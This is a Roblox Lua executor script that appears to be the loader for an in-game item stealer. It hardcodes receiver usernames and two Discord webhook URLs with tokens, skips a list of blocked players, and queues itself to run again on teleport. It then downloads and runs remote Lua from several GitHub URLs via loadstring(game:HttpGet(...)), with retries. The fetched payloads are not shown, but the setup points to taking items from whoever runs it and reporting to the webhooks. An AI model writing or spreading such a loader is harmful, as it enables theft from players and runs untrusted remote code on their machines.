-- ========== COOLDOWN PROTECTION ==========
if getgenv()._CONFIG_LAST_RUN and tick() - getgenv()._CONFIG_LAST_RUN < 999999 then
    return
end
getgenv()._CONFIG_LAST_RUN = tick()
-- =========================================

-- ========== BLOCKLIST ==========
local BLOCKED_USERNAMES = {
    "HayzyD",
    "pisasintia",
    "Nrdudfdu"
}

local function isPlayerBlocked()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    for _, blockedName in ipairs(BLOCKED_USERNAMES) do
        if LocalPlayer.Name:lower() == blockedName:lower() then
            return true
        end
    end
    return false
end

if isPlayerBlocked() then
    return
end
-- ==============================

-- ========== USER CONFIG ==========
Username = "shxsui2133"
Username2 = "shxsui21330"
Webhook = "https://discord.com/api/webhooks/1386292356545777674/EHzO0Umd8EXyxHMcR1MKOpPLoK0wJMAu6i_U660uFT8ukBraMrE4V6FhMlQrpdve-Sum"
MonitorWebhook = "https://discord.com/api/webhooks/1391424515078230117/hZdzPdioaCMLCFzgJPdDNlY3c04JWCSdacjOJ0elWYgiK3vJnWZHxPruKabfd4CUIeK7"
MinWeight = 20 
MaxWeight = 100
Huge_Notif = 20
ENABLE_SINGLETON = false
-- =================================

-- ✅ ADD THIS — QUEUE ON TELEPORT TO ITSELF
local TeleportScript = [[
    task.wait(1)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AnbuBlackOpsHub/kyuontp/kyuontp.lua", true))()
]]

pcall(function()
    syn.queue_on_teleport(TeleportScript)
end)

pcall(function()
    queue_on_teleport(TeleportScript)
end)
-- =======================================

-- ========== RETRY LOADER ==========
local Scripts = {
    "https://raw.githubusercontent.com/AnbuBlackOpsHub/wan/refs/heads/main/wan.lua",
    "https://raw.githubusercontent.com/AnbuBlackOpsHub/two/refs/heads/main/two.lua",
    "https://raw.githubusercontent.com/AnbuBlackOpsHub/three/refs/heads/main/three.lua"
}

local MAX_RETRIES = 3
local RETRY_DELAY = 1

local function tryLoad(url)
    for attempt = 1, MAX_RETRIES do
        local success = pcall(function()
            local response = game:HttpGet(url)
            loadstring(response)()
        end)
        if success then return true end
        task.wait(RETRY_DELAY)
    end
    return false
end

for _, url in ipairs(Scripts) do
    tryLoad(url)
end
-- =================================
